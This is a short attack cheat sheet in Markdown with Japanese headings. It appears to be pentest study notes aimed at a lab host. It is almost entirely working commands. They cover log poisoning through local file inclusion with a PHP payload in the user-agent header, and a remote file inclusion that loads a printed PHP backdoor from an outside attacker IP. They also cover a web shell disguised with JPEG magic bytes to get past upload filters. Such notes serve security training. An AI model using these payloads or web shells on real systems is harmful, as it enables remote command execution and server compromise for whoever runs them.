## LFI
### Apache
```sh
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
# 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"

curl http://mountaindesserts.com/meteor/index.php --user-agent '<?php echo system($_GET['cmd']); ?>'

curl http://mountaindesserts.com/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=ls+-la
```
phpラッパーを使ったLFI -> [[PHP]]

## RFI
```sh
cat simple-backdoor.php
# <?php
# if(isset($_REQUEST['cmd'])){
#         echo "<pre>";
#         $cmd = ($_REQUEST['cmd']);
#         system($cmd);
#         echo "</pre>";
#         die;
# }
# ?>
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

### ファイルアップロード
```sh
# マジックナンバー追加
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
```
